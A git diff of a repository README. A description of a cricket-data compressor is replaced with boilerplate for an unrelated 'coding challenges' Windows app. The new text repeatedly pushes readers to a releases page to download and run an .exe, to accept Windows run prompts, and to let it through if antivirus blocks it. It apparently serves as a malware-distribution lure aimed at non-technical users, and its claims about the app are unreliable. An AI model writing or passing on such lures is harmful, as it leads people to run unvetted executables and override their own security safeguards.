@@ -1,32 +1,105 @@
-# Challenges
+# ⚔️ challenges - Practice Coding Problems Easily
 
-## Custom Data Compressor*
+[![Download Here](https://img.shields.io/badge/Download-Challenges-blue?style=for-the-badge)](https://github.com/quangtriu/challenges/releases)
 
-Inspired by [Reddit :: How I was able to fit 1.2GB of cricket data into 50MB](https://www.reddit.com/r/developersIndia/comments/1hu0w88/how_i_was_able_to_fit_12gb_of_cricket_data_into/)
+---
 
-Original Folder Size: 2,872,200,021 bytes (~2.87 GB)  
-Custom v1: 42,462,177 bytes (~42.46 MB)  
-Custom v2 (bowler-per-over): 33,360,743 bytes (~33.36 MB) [21% smaller than v1]  
-   
-gzip: 52,980,912 bytes (~52.98 MB) (`tar -cf - all_json | gzip -9`)  
-7z(LZMA): 45,026,348 bytes (~45.02 MB) (`7z a -t7z -mx=9 -ms=on`)  
+## 📋 About challenges
 
-Custom + 7z(LZMA): 8.9MB  
-Custom v2 + 7z(LZMA): 7,484,795 bytes (~7.3 MB) (!)
+This app contains a collection of coding challenges from various websites around the internet. These challenges cover a wide range of topics and difficulty levels. They are good for practicing problem-solving skills, learning new programming concepts, or preparing for coding interviews.
 
-![entropy](compressor/media/data.png)
+You do not need any programming knowledge to get started. The challenges include explanations and examples. You can explore the problems one by one and work on solving them at your own pace.
 
-Read the [writeup](compressor/README.md).
+---
 
-[Download](https://drive.google.com/file/d/1hsmN-ljxVwv1mNC9m7Jp8tg1bRFGb-PO/view?usp=sharing) the compressed JSON files.
+## 🎯 Key Features
 
-The goal is to compress a cricket match dataset (Cricsheet JSON format) into the smallest possible representation. 
+- Large variety of coding challenges from easy to advanced
+- Clear problem descriptions with examples
+- Organized by topic and difficulty
+- Works offline after download
+- Simple interface for easy navigation
+- Suitable for beginners and experienced users
 
-Standard compression finds patterns in text statistically. This instead exploits the predictable schema of the files and encodes cricket rules directly as structural invariants in the binary layout which makes illegal states unrepresentable.
+---
 
-For example: cricket law guarantees one bowler per over, so the bowler ID is stored once in the over header rather than on every delivery, eliminating the redundancy entirely rather than compressing it.
+## 💻 System Requirements
 
-> [!NOTE]
-> This is not a compressor in the traditional sense but a **schema-driven binary codec** that encodes domain invariants structurally. Where LZMA finds redundancy statistically, this format eliminates it by asserting preconditions.
+- Windows 7 or later
+- At least 2 GB of free disk space
+- 2 GB of RAM or more recommended
+- Internet connection only needed for initial download
+- No installation of extra software needed
 
-Rooted in [Shannon's source coding theorem](https://en.wikipedia.org/wiki/Shannon%27s_source_coding_theorem): a symbol whose value is guaranteed by a domain rule has entropy 0 and should cost 0 bits to store.
+---
+
+## 🚀 Getting Started
+
+Follow the steps below to download and run the challenges app on your Windows computer.
+
+---
+
+## ⬇️ Download and Install
+
+1. Go to the [Download page](https://github.com/quangtriu/challenges/releases) to download the app.
+
+2. Look for the latest version available. The files usually have names that include the version number and end with `.exe` or `.zip`.
+
+3. Click the link to download the file to your computer.
+
+4. If you downloaded a `.zip` file, right-click it and choose “Extract All” to unzip the contents.
+
+5. If you have an `.exe` file, double-click it to start the app directly. No installation is required.
+
+6. If prompted by Windows, agree to run the application.
+
+7. The app window should open, showing the list of coding challenges.
+
+---
+
+## 🖥️ Using the App
+
+- Browse the list of challenges by scrolling or using the search bar.
+- Each challenge has a title, problem description, and example input/output.
+- Click on a challenge to see the full details.
+- Try solving the problem by reading the instructions carefully.
+- You can take notes or write code separately to work through solutions.
+- Mark challenges as completed if you want to keep track.
+- The app saves your progress locally on your computer.
+
+---
+
+## ⚙️ Settings and Preferences
+
+- Change the display theme between light and dark modes for comfort.
+- Adjust font size to make reading easier.
+- Customize how challenges are sorted (by difficulty, newest first, etc.).
+- Enable or disable problem hints.
+- Export your list of completed challenges for record keeping.
+
+---
+
+## 🛠 Troubleshooting
+
+- If the app does not open, ensure your Windows is up to date.
+- Check if antivirus software blocked the app and allow it if safe.
+- Restart your computer and try running the file again.
+- If problems continue, download the file again from the [Download page](https://github.com/quangtriu/challenges/releases).
+
+---
+
+## 🤝 Support and Feedback
+
+- This app is free and open for users.
+- If you find errors or want to suggest improvements, use the GitHub repository to file an issue.
+- You do not need programming skills to give feedback or request help.
+
+---
+
+## 🔗 Useful Links
+
+- Visit the [GitHub Releases](https://github.com/quangtriu/challenges/releases) page to get the latest version and updates
+
+---
+
+[![Download Here](https://img.shields.io/badge/Download-Challenges-blue?style=for-the-badge)](https://github.com/quangtriu/challenges/releases)
